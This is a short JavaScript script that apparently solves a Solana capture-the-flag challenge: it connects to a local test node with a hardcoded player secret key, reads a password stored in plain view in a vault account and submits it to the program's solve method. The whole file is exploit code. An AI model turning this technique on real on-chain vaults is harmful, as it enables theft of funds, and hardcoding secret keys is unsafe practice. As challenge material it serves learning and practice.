const anchor = require('@coral-xyz/anchor');
const bs58 = require('bs58');
const { Keypair, PublicKey } = anchor.web3;

// Replace these values with your own
PLAYER_KEYPAIR = "5nPX4iuDVLGCh3xZggJU6bwnjv3zRut4tMaBjSjGdKohtjvsaixUyh5svHa7yJDirH3NvkF4va7NLo7UncPL3xyY"
CTX_PUBKEY = "DbHw2eMb8HTnrmmLtPfNcz1mFVd6D37tCEc8Ge7BewXm"
PROGRAM_ID = "AzaM5NoRLmqbhwkfeJTmutZSitPvdY6cgePPbGuKfVTE"
RPC_URL = "http://localhost:7752/79da066c-f3a1-4731-86d2-10ec4acee06c"
const main = async () => {
  try {
    // Create a connection to the cluster
    const connection = new anchor.web3.Connection(RPC_URL);

    // Decode the base58 secret key to create the wallet keypair
    const secretKey = bs58.default.decode(PLAYER_KEYPAIR);
    const walletKeypair = Keypair.fromSecretKey(secretKey);
    const wallet = new anchor.Wallet(walletKeypair);

    // Create a provider and set it as the default
    const provider = new anchor.AnchorProvider(connection, wallet, { commitment: "finalized" });
    anchor.setProvider(provider);

    // Create the program interface
    const programId = new PublicKey(PROGRAM_ID);
    const program = await anchor.Program.at(programId, provider);

    // Define the vault account public key
    const vaultPubkey = new PublicKey(CTX_PUBKEY);

    console.log("Attempting to exploit vault:", vaultPubkey.toString());
    
    // Add this code to fetch vault account data
    var vaultData = await program.account.vaultState.fetch(vaultPubkey);
    const password = vaultData.password;
    console.log("Password:", password);

    const tx = await program.methods
      .solve(password)
      .accounts({
        vault: vaultPubkey,
      })
      .rpc();
    const signatureResult = await provider.connection.confirmTransaction(tx);
    console.log(JSON.stringify({"message": signatureResult}));
    vaultData = await program.account.vaultState.fetch(vaultPubkey);
    console.log("Vault data:", vaultData);
    
  } catch (error) {
    console.error("Error during exploit:", error);
  }
};

main().catch(console.error);
